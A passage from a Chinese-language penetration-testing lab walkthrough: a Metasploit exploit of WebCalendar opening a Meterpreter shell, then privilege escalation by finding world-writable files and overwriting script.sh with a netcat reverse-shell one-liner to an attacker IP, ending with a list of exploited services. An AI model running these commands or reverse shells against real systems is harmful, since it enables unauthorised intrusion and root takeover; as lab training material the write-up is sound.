+msf6 exploit(linux/http/webcalendar_settings_exec) > options
+msf6 exploit(linux/http/webcalendar_settings_exec) > set rhosts calendar.typhoon.local
+msf6 exploit(linux/http/webcalendar_settings_exec) > set targeturi /
+msf6 exploit(linux/http/webcalendar_settings_exec) > run
+
+[*] Started reverse TCP handler on 192.168.220.128:4444 
+[*] Housing php payload...
+[*] Loading our payload...
+[*] Sending stage (3045380 bytes) to 192.168.220.132
+[*] Meterpreter session 1 opened (192.168.220.128:4444 -> 192.168.220.132:33005)
+
+获得反弹shell
+meterpreter > shell
+Process 3193 created.
+Channel 1 created.
+id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+
+后续步骤请参考 [-渗透方案0x00 "Drupal, 你也不想让别人发现你的秘密吧~"-] 章节
+里面讲述的非常详细, 不做过多阐述
+
+[-本章小结-]
+利用 DNS 服务器的漏洞, 对目标机器进行刺探, 是一种不错的方法
+后续仍然搭配已知漏洞进行渗透, 对水平不予评价
+
+=====================================
+[-渗透方案0x0A "是无意, 还是有意的 script.sh?"-]
+
+这里假设攻击者已经进入目标机器, 但仍未能提权成功
+
+现在使用脚本, 对目录文件进行枚举, 查找有利用价值的目标文件
+脚本未经测试, 详细请自行分析
+#!/bin/bash
+
+# 查找指定目录及其子目录中权限为777的文件，并输出它们的路径
+
+if [ $# -eq 0 ]; then
+  echo "Usage: $0 <directory>"
+  exit 1
+fi
+
+directory="$1"
+
+if [ ! -d "$directory" ]; then
+  echo "Error: '$directory' is not a valid directory."
+  exit 1
+fi
+
+find "$directory" -type f -perm 777
+
+发现在 /tab/ 目录下 存在权限为 777 的目标文件 script.sh
+现在对其进行修改利用
+(目标机器) echo "mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 192.168.220.128 8888 > /tmp/f" > script.sh
+kali@kali[~]$ nc -vlp 8888
+(目标机器) ./script.sh
+
+至此攻击者获得 root 权限
+
+[-本章小结-]
+利用目标机器上的有价值的文件进行提权
+称不上什么高端手法, 但也算一种思路
+
+=====================================
+[-总结-]
+
+情报收集是重中之重, 可以说没有情报的辅佐, 渗透将变得寸步难行
+
+同时介绍了以下的渗透技巧, 算是入门渗透的基础测试
+nmap全端口信息枚举
+drupal漏洞利用
+SSH端口爆破
+phpMoAdmin利用
+LotusCMS漏洞利用
+Tomca漏洞利用
+Shellshock漏洞利用
+NSF漏洞利用
+Samba远程代码执行漏洞
+PostgreSQL漏洞利用
+DNS漏洞利用-区域攻击
+
+最后希望各位, 莫忘来路, 继续前行
+正如那已逝的贤者所言:
+人类总 "在无知与迷茫中寻找存在的意义"
+Have Fun For Your Life :)
